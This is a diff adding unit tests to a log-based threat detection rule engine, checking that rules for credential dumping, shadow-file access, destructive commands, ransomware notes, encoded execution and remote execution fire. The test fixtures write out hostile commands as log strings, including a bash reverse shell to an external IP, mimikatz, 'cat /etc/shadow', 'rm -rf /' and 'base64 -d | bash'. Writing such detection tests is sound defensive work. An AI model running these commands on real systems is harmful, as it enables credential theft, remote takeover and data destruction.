@@ -114,6 +114,27 @@ class RuleEngineTests(unittest.TestCase):
         self.engine.evaluate_log("a", "auth.log", "bash -i >& /dev/tcp/1.2.3.4/4444")
         self.assertNotIn("reverse_shell", self._fired())
 
+    def test_expanded_mitre_rules_fire(self):
+        cases = {
+            "credential_dumping": "invoking mimikatz sekurlsa::logonpasswords now",
+            "shadow_file_access": "cat /etc/shadow > /tmp/x",
+            "destructive_command": "root ran rm -rf / on the box",
+            "ransomware_indicator": "dropped README_FOR_DECRYPT note: YOUR FILES ARE ENCRYPTED",
+            "encoded_command_exec": "echo payload | base64 -d | bash",
+            "remote_exec_tool": "wmic /node:10.0.0.5 process call create calc",
+        }
+        for key, line in cases.items():
+            self.alerts.clear()
+            self.engine.evaluate_log("h", "auth.log", line)
+            self.assertIn(key, self._fired(), f"rule {key} did not fire on: {line}")
+
+    def test_all_default_regexes_compile(self):
+        import re
+        from autosoc.detection.default_rules import DEFAULT_RULES
+        for rule in DEFAULT_RULES:
+            if rule.get("pattern"):
+                re.compile(rule["pattern"])  # raises on invalid
+
     def test_clean_log_no_alerts(self):
         self.engine.evaluate_log("a", "auth.log", "Accepted publickey for deploy from 10.0.0.2")
         # 'Accepted publickey' matches the benign successful-login rule (Low), but not high-risk ones.
